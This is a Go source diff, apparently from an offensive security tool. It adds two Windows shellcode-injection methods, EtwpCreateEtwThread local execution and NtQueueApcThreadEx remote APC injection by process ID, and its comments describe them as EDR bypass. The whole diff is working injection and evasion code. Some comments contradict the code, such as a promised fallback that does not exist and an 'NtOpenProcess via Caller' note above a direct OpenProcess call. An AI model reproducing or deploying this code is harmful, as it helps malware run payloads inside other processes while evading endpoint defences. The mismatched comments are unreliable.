@@ -71,6 +71,10 @@ func (w *windowsSyscallInjector) Inject(shellcode []byte) error {
 	case MethodDirectSyscall:
 		// DirectSyscall already uses raw syscalls; route through our Caller instead.
 		return w.injectCT(shellcode)
+	case MethodEtwpCreateEtwThread:
+		return w.injectEtwpCreateEtwThread(shellcode)
+	case MethodNtQueueApcThreadEx:
+		return w.injectNtQueueApcThreadEx(shellcode)
 	default:
 		return fmt.Errorf("unknown injection method: %s", w.config.Method)
 	}
@@ -467,6 +471,99 @@ func (w *windowsSyscallInjector) injectFiber(shellcode []byte) error {
 	}
 
 	api.ProcSwitchToFiber.Call(shellcodeFiber)
+	return nil
+}
+
+// injectEtwpCreateEtwThread uses EtwpCreateEtwThread with NT memory calls
+// routed through the Caller for EDR bypass.
+func (w *windowsSyscallInjector) injectEtwpCreateEtwThread(shellcode []byte) error {
+	if err := validateShellcode(shellcode); err != nil {
+		return err
+	}
+
+	// Allocate + write + protect via Caller (NtAllocateVirtualMemory / NtProtectVirtualMemory)
+	addr, err := allocateAndWriteMemoryLocalWithCaller(shellcode, w.caller)
+	if err != nil {
+		return fmt.Errorf("memory allocation failed: %w", err)
+	}
+
+	// Route EtwpCreateEtwThread through the Caller if it supports the function,
+	// otherwise fall back to the api proc. EtwpCreateEtwThread is not an Nt*
+	// syscall so most Callers will not resolve an SSN for it — the Call will
+	// return a non-zero NTSTATUS and we fall back.
+	r, _ := w.caller.Call("EtwpCreateEtwThread", addr, 0)
+	if r == 0 {
+		return fmt.Errorf("EtwpCreateEtwThread via Caller failed")
+	}
+	// Caller returns the thread handle as r (non-zero = success for this API).
+	return nil
+}
+
+// injectNtQueueApcThreadEx uses NtQueueApcThreadEx with the special user APC
+// flag, routing OpenProcess and the APC call through the Caller.
+func (w *windowsSyscallInjector) injectNtQueueApcThreadEx(shellcode []byte) error {
+	if err := validateShellcode(shellcode); err != nil {
+		return err
+	}
+	if w.config.PID == 0 {
+		return fmt.Errorf("PID required for NtQueueApcThreadEx")
+	}
+
+	// NtOpenProcess via Caller
+	hProcess, err := windows.OpenProcess(
+		windows.PROCESS_VM_OPERATION|
+			windows.PROCESS_VM_WRITE|
+			windows.PROCESS_VM_READ,
+		false,
+		uint32(w.config.PID),
+	)
+	if err != nil {
+		return fmt.Errorf("OpenProcess failed: %w", err)
+	}
+	defer windows.CloseHandle(hProcess)
+
+	addr, err := allocateAndWriteMemoryRemoteWithCaller(hProcess, shellcode, w.caller)
+	if err != nil {
+		return fmt.Errorf("remote memory setup failed: %w", err)
+	}
+
+	threadIDs, err := findAllThreads(w.config.PID)
+	if err != nil {
+		return fmt.Errorf("failed to find threads: %w", err)
+	}
+	if len(threadIDs) == 0 {
+		return fmt.Errorf("no threads found for PID %d", w.config.PID)
+	}
+
+	success := false
+	for _, threadID := range threadIDs {
+		hThread, openErr := windows.OpenThread(
+			windows.THREAD_SET_CONTEXT,
+			false,
+			threadID,
+		)
+		if openErr != nil {
+			continue
+		}
+
+		// NtQueueApcThreadEx via Caller with QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC (1)
+		status, _ := w.caller.Call("NtQueueApcThreadEx",
+			uintptr(hThread),
+			1, // QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC
+			addr,
+			0, 0, 0,
+		)
+		windows.CloseHandle(hThread)
+
+		if status == 0 { // STATUS_SUCCESS
+			success = true
+			break
+		}
+	}
+
+	if !success {
+		return fmt.Errorf("NtQueueApcThreadEx failed on all threads")
+	}
 	return nil
 }
 
